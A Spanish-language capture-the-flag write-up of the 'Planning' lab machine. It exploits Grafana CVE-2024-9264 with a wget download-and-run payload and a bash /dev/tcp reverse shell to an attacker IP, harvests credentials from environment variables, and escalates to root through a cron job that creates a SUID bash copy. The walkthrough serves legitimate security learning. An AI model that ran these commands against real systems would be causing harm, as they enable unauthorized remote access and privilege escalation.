---
tags:
  - Nmap
  - CronJobs
  - Subdominios
  - Grafana
  - RevShell
  - wget
  - ssh-L
  - ssh
  - chmod
  - RCE
  - Port_Forwarding
  - Escalada_Privilegios
  - root
  - Shell
  - Docker
  - SUID
  - CVE-2024-9264
  - FFUF
  - Netcat
  - CronTab
  - Linux
---

Nos enfrentamos contra una maquina linux level easy en donde nos proporcionan unas credenciales para acceder `admin / 0D5oT70Fq13EvB5r`

## Nmap 


El primer paso es utilizar la herramienta nmap y realizar un escaneo basico de puertos. Utilizaremos los siguientes parametros `nmap -A -sV --top-ports 100` y este es el resultado del escaneo 

```bash
─(kali㉿kali)-[~]
└─$ nmap -A -sV --top-ports 100 10.10.11.68
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 16:29 EDT
Nmap scan report for 10.10.11.68
Host is up (0.39s latency).
Not shown: 98 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://planning.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   129.95 ms 10.10.14.1
2   130.41 ms 10.10.11.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.56 seconds

```


En el escaneo podemos ver que los puertos 22 (ssh) y el puerto 80 (http) se encuentran abiertos entonces el proximo paso sera acceder al http a ver que podemos encontrar

### Enumeracion de Subdominios

Después de realizar un escaneo inicial con **nmap** y analizar el sitio web principal, no encontramos funcionalidades relevantes que pudiéramos explotar. Por lo tanto, decidimos ampliar la superficie de ataque realizando un **escaneo de subdominios virtuales**.

Utilizamos **ffuf** para llevar a cabo una enumeración de subdominios, aprovechando la técnica de vhosts, enviando el parámetro `Host` con el patrón `FUZZ.planning.htb`. Para ello, empleamos el wordlist de **Bitquark top 100000**:

```bash
(kali㉿kali)-[~]
└─$ ffuf -u http://10.10.11.68 -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host:FUZZ.planning.htb" -fs 178 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.68
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.planning.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

grafana                 [Status: 302, Size: 29, Words: 2, Lines: 3, Duration: 114ms]
:: Progress: [100000/100000] :: Job [1/1] :: 347 req/sec :: Duration: [0:05:13] :: Errors: 0 ::

```

#### Resultado:

Durante el escaneo se identificó el siguiente subdominio válido:

- **grafana.planning.htb** → **[Status: 302]**

El código de estado **302 Found** indica una redirección, lo cual sugiere la presencia de un panel de administración de **Grafana**.

### ¿Qué es Grafana?

**Grafana** es una plataforma de código abierto ampliamente utilizada para la visualización y monitorización de datos. Permite crear dashboards interactivos que muestran métricas, logs y datos en tiempo real provenientes de diferentes fuentes (bases de datos, servicios cloud, herramientas de monitorización, etc.).

En entornos corporativos, Grafana suele ser utilizado para supervisar la infraestructura de redes, servidores, aplicaciones y servicios críticos. Debido a su naturaleza de panel de administración, suele estar protegido mediante autenticación, pero si se encuentra mal configurado, expuesto públicamente o con credenciales por defecto, puede ser un punto de entrada muy valioso para un atacante.

### Relevancia en pentesting

Desde el punto de vista de la seguridad ofensiva, encontrar un panel de **Grafana expuesto** puede ser una gran oportunidad, ya que:

- Puede permitir el **acceso no autorizado** si no se ha configurado correctamente.

- Existen **vulnerabilidades conocidas** en versiones antiguas que permiten **escalado de privilegios**, **lectura de archivos locales** (LFI), o incluso **ejecución remota de comandos (RCE)**.

- Puede revelar **credenciales hardcodeadas**, **tokens API**, y otros datos sensibles.

# GRAFANA  **CVE-2024-9264**

La vulnerabilidad **CVE-2024-9264** permite a un usuario autenticado en Grafana ejecutar código remoto (RCE) o leer archivos arbitrarios mediante una inyección SQL en DuckDB. Este exploit afecta específicamente a **Grafana v11.0.0** cuando el binario de DuckDB está instalado en el servidor.

### **Requisitos Previos**

1. **Credenciales válidas** de un usuario en Grafana (ej: `admin:0D5oT70Fq13EvB5r`).
2. **DuckDB instalado** en el servidor Grafana (no viene por defecto).
3. **Script de explotación**: `CVE-2024-9264.py` 
4. Servidor HTTP local para hospedar archivos maliciosos (ej: `shell.php`).
5. Escucha en un puerto para recibir la reverse shell.

### Configuracion del Entorno

Configuramos un servidor http y Netcat de la siguiente manera 

```bash
─(kali㉿kali)-[~/CVE-2024-9264]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
(kali㉿kali)-[~]
└─$ nc -lvnp 1443                           
listening on [any] 1443 ...
```

### Rev Shell

vamos a crear la siguiente reverse shell con este comando

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.8/1443 0>&1
```

w#### `#!/bin/bash`

- Esta es la **shebang line**, y le indica al sistema que el script debe ser ejecutado usando el intérprete de bash.
- Es obligatoria si quieres que el script se ejecute correctamente como archivo por sí solo.
#### `bash -i`

- Ejecuta una **nueva instancia interactiva** de bash.
- La `-i` significa _interactive shell_, lo cual es necesario para que puedas interactuar con la terminal una vez establecida la conexión.
- Sin `-i`, la shell remota podría no responder correctamente a tus comandos.

#### `>& /dev/tcp/10.10.15.8/1443`

- Esta parte redirige tanto la **salida estándar** (`stdout`) como la **salida de errores** (`stderr`) hacia la conexión TCP.
- `/dev/tcp/10.10.15.8/1443` es una característica especial de bash (no existe como archivo real), que permite abrir una conexión TCP con esa IP y puerto como si fuera un archivo.
- Es decir, todo lo que el bash imprima (tanto salida como errores) irá a esa conexión.

#### `0>&1`

- Esto redirige la **entrada estándar** (`stdin`) a la misma conexión donde ya están saliendo los datos (la `&1` es la salida).
- De esta forma, el atacante puede **enviar comandos desde su máquina** y la shell los interpretará correctamente.


##### Que hace todo conjunto?

- Establece una **reverse shell interactiva** desde el host víctima hacia el atacante (10.10.15.8) en el puerto 1443.

- Todo lo que escribas en el `nc` del atacante se enviará a la shell, y todo lo que la shell responda volverá por el mismo canal.

## Inyeccion de Exploit

Una vez identificado que el sistema es vulnerable a la **CVE-2024-9264**, ejecutamos el exploit disponible públicamente, proporcionando las credenciales válidas del usuario `admin` y utilizando el parámetro `-c` para inyectar un payload con el objetivo de obtener una reverse shell.

El exploit utilizado es el siguiente:

```bash
(planning)─(kali㉿kali)-[~/CVE-2024-9264]
└─$ python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.15.8:8000/shell.php -O /tmp/shell.php && chmod +x /tmp/shell.php && /tmp/shell.php" http://grafana.planning.htb
[+] Logged in as admin:0D5oT70Fq13EvB5r
[+] Executing command: wget http://10.10.15.8:8000/shell.php -O /tmp/shell.php && chmod
+x /tmp/shell.php && /tmp/shell.php
```

Este comando realiza lo siguiente:

- `-u admin -p 0D5oT70Fq13EvB5r`: especifica las credenciales válidas para autenticarse.

- `-c "<comando>"`: inyecta el comando que se ejecutará remotamente mediante la vulnerabilidad RCE.

- `http://grafana.planning.htb`: especifica la URL del servidor vulnerable.

- - **`wget http://10.10.15.8:8000/shell.php -O /tmp/shell.php`**

Descarga un archivo malicioso (`shell.php`) desde mi servidor atacante al directorio `/tmp` de la máquina víctima.

- **`chmod +x /tmp/shell.php`**  
Cambia los permisos del archivo descargado para hacerlo ejecutable.

- **`/tmp/shell.php`**  
Ejecuta el script descargado, el cual contiene una reverse shell en Bash que conecta de vuelta a mi máquina atacante (IP 10.10.15.8, puerto 1443).

## Conexion RCE

Una vez ejecutado el payload remoto logramos establecer una conexion exitosa con la maquina victima

```bash
(kali㉿kali)-[~]
└─$ nc -lvnp 1443                           
listening on [any] 1443 ...
connect to [10.10.15.8] from (UNKNOWN) [10.10.11.68] 42376
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@7ce659d667d7:~# 
```

Como se observa en la shell recibida, la conexión proviene de la IP interna `10.10.11.68` y se obtiene acceso como **usuario root** dentro del contenedor, lo que indica una explotación exitosa de la vulnerabilidad RCE. A partir de este punto, ya es posible interactuar con el sistema comprometido y continuar con la post-explotación o la posible escalada de privilegios hacia el host, si es necesario.

Una vez obtenida la shell reversa dentro del contenedor, se procede a buscar información sensible que pueda permitir acceso persistente o privilegios adicionales. Se navega hasta el directorio de trabajo de Grafana ubicado en: 

```bash
root@7ce659d667d7:/# cd var/lib/grafana
cd var/lib/grafana
```

Desde allí, se ejecuta el comando `env` para listar las **variables de entorno** disponibles en el entorno del contenedor, lo cual es una práctica común para descubrir credenciales hardcodeadas o configuraciones sensibles:

```bash
root@7ce659d667d7:/var/lib/grafana# env
env
AWS_AUTH_SESSION_DURATION=15m
HOSTNAME=7ce659d667d7
PWD=/var/lib/grafana
AWS_AUTH_AssumeRoleEnabled=true
GF_PATHS_HOME=/usr/share/grafana
AWS_CW_LIST_METRICS_PAGE_LIMIT=500
HOME=/usr/share/grafana
AWS_AUTH_EXTERNAL_ID=
SHLVL=2
GF_PATHS_PROVISIONING=/etc/grafana/provisioning
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
GF_SECURITY_ADMIN_USER=enzo
GF_PATHS_DATA=/var/lib/grafana
GF_PATHS_LOGS=/var/log/grafana
PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
AWS_AUTH_AllowedAuthProviders=default,keys,credentials
GF_PATHS_PLUGINS=/var/lib/grafana/plugins
GF_PATHS_CONFIG=/etc/grafana/grafana.ini
_=/usr/bin/env
OLDPWD=/
```

# SSH

Con las credenciales que previamente adquirimos vamos a proceder a conectarnos al servicio de SSH con el siguiente comando

```bash
                                                                                    
┌──(kali㉿kali)-[~]
└─$ ssh enzo@10.10.11.68        
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri May 16 08:57:27 AM UTC 2025

  System load:           0.0
  Usage of /:            65.1% of 6.30GB
  Memory usage:          41%
  Swap usage:            0%
  Processes:             235
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.68
  IPv6 address for eth0: dead:beef::250:56ff:feb0:a99e


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri May 16 08:57:31 2025 from 10.10.15.8
```

Una vez adentro procederemos a realizar los siguientes comandos de reconocimiento y nos encontraremos con el user.txt 

```bash
enzo@planning:~$ pwd
/home/enzo
enzo@planning:~$ ls
user.txt
enzo@planning:~$ cat user.txt
bc5fc8b232f3fb7d66894f22748b198e
enzo@planning:~$ 
```

## Escalada de Privilegios

Durante la fase de enumeración posterior a la obtención de la shell como el usuario `enzo`, realizamos un recorrido por el sistema de archivos en busca de configuraciones inusuales o posibles vectores de escalada de privilegios. Al inspeccionar el directorio `/opt`, encontramos una carpeta interesante llamada `crontabs`:

```bash
enzo@planning:~$ cd ../..
enzo@planning:/$ ls
bin                dev   lib64              mnt   run                 sys
bin.usr-is-merged  etc   lib.usr-is-merged  opt   sbin  
boot               home  lost+found         proc  sbin.u
cdrom              lib   media              root  srv   
enzo@planning:/$ cd opt
enzo@planning:/opt$ ls
containerd  crontabs
enzo@planning:/opt$ cd crontabs
```

Dentro de `crontabs` se hallaba un archivo llamado `crontab.db`:
 ```bash
 enzo@planning:/opt/crontabs$ ls
crontab.db
enzo@planning:/opt/crontabs$ cat crontab.db
{"name":"Grafana backup","command":"/usr/bin/docker saverafana.tar && /usr/bin/gzip /var/backups/grafana.tar && ackups/grafana.tar.gz.zip /var/backups/grafana.tar.gz &&","schedule":"@daily","stopped":false,"timestamp":"Fri Foordinated Universal Time)","logging":"false","mailing":ed":false,"_id":"GTI22PpoJNtRKg0W"}
{"name":"Cleanup","command":"/root/scripts/cleanup.sh",":false,"timestamp":"Sat Mar 01 2025 17:15:09 GMT+0000 (Cgging":"false","mailing":{},"created":1740849309992,"savYX"}
```

Al inspeccionarlo, encontramos entradas en formato JSON que parecían representar tareas programadas por un sistema alternativo de cron (posiblemente gestionado mediante una interfaz web):

A pesar de que algunas partes del JSON están corruptas o malformateadas, se puede observar claramente que hay una tarea llamada **"Cleanup"** que ejecuta el siguiente comando:

```bash
/root/scripts/cleanup.sh
```

El hecho de que ese script se encuentre en `/root/` sugiere que podría ejecutarse como el usuario `root`, lo que representa una **oportunidad de escalada de privilegios**, si logramos modificar ese archivo o inyectar una tarea personalizada.

### Port forwarding para acceder al panel web

Dado que la tarea `"Grafana backup"` menciona `docker`, `grafana` y rutas como `/var/backups/`, es probable que exista una **interfaz web que gestione estas tareas de cron desde localhost** (por ejemplo, una app Node.js, Flask o similar).

Procedemos a establecer un túnel SSH con port forwarding:

```bash
(kali㉿kali)-[~]
└─$ ssh -L 8000:127.0.0.1:8000 enzo@planning.htb
enzo@planning.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri May 16 09:28:51 AM UTC 2025

  System load:           0.0
  Usage of /:            65.2% of 6.30GB
  Memory usage:          43%
  Swap usage:            0%
  Processes:             243
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.68
  IPv6 address for eth0: dead:beef::250:56ff:feb0:a99e


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri May 16 09:29:29 2025 from 10.10.15.8

```

Contraseña del usuario `enzo`: `RioTecRANDEntANT!`

Con esto, accedemos a la interfaz en nuestro navegador visitando `http://localhost:8000`, donde probablemente podremos:

- Ver o editar tareas de cron.

- Crear nuevas tareas maliciosas.

- Inyectar comandos para obtener una **reverse shell como root** o leer directamente el `root.txt`.

### Crear una tarea cron para escalar privilegios a root

Ahora que estamos en el paso final, que consiste en **crear una nueva tarea programada (cronjob)** para escalar privilegios y obtener acceso como usuario `root`.

El objetivo es usar cron para ejecutar un comando que copie el binario de Bash en el directorio `/tmp` y luego le establezca el **bit SUID**. Esto nos permitirá ejecutar esa copia de Bash con permisos de root.

El comando que colocamos en la tarea cron es:

```bash
cp /bin/bash /tmp/bash && chmod +s /tmp/bash
```



<img width="1912" height="716" alt="Image" src="https://github.com/user-attachments/assets/6791c158-54da-4b5f-8647-8d7203240b74" />

Luego de ejecutar el cron job, nos dirigimos a la carpeta `/tmp`, donde ya se encuentra copiado el binario de `bash` con el bit SUID activado. Esto nos permite ejecutar ese binario con permisos de root. Usamos los siguientes comandos:

```bash
enzo@planning:/tmp$ ls
bash
systemd-private-85bfd5b47fa744c6a8f73000c82d9913-fwupd.service-4OsbDs
systemd-private-85bfd5b47fa744c6a8f73000c82d9913-ModemManager.service-wexOSp
systemd-private-85bfd5b47fa744c6a8f73000c82d9913-polkit.service-eeUgaJ
systemd-private-85bfd5b47fa744c6a8f73000c82d9913-systemd-logind.service-rt6ZEl
systemd-private-85bfd5b47fa744c6a8f73000c82d9913-systemd-resolved.service-fMBUuX
systemd-private-85bfd5b47fa744c6a8f73000c82d9913-systemd-timesyncd.service-vstRhJ
systemd-private-85bfd5b47fa744c6a8f73000c82d9913-upower.service-3PClmk
vmware-root_733-4248680474
WXioFdKQBvuDNEVQ.stderr
WXioFdKQBvuDNEVQ.stdout
YvZsUUfEXayH6lLj.stderr
YvZsUUfEXayH6lLj.stdout

```

Ahora ejecutamos el binario `bash` con el flag `-p` para preservar los privilegios del propietario (root):

```bash
enzo@planning:/tmp$  ./bash -p
bash-5.2# whoami
root
```

Finalmente lo tenemos... ahora solo falta buscar el root.txt que se encuentra en la carpeta `/root/root.txt`

```bash
bash-5.2# cd root
bash-5.2# ls
root.txt  scripts
bash-5.2# cat root.txt

```
### Tecnologías atacadas y cómo se explotaron:

1. **Docker (mal configurado)**  
    Se encontró una entrada en `/opt/crontabs/crontab.db` que mostraba comandos mal construidos que ejecutaban contenedores Docker. Aunque no se explotó directamente, reveló la presencia de tareas automatizadas como backups, lo cual ayudó a identificar archivos sensibles como scripts en `/root/scripts`.
    
2. **Crontab personalizado expuesto**  
    La presencia del archivo `crontab.db` en `/opt/crontabs` reveló información de cronjobs personalizados, incluyendo uno que ejecutaba `/root/scripts/cleanup.sh`. Esto nos dio una pista sobre una posible **escalada de privilegios** mediante la inyección de comandos en cronjobs ejecutados por el usuario root.
    
3. **Cronjob mal asegurado / ejecución como root**  
    Se aprovechó la capacidad de editar cronjobs personalizados o inyectar uno nuevo que ejecutara comandos con privilegios de root. En este caso, se añadió un cronjob que copiaba el binario de bash a `/tmp` y le aplicaba el bit SUID, permitiendo luego ejecutar un shell como root.
4. **SUID Bit Abuse**  
    Al establecer el bit SUID en el binario copiado de `bash`, se permitió escalar privilegios. Al ejecutarlo con `./bash -p`, el shell resultante tuvo privilegios root sin necesidad de credenciales.

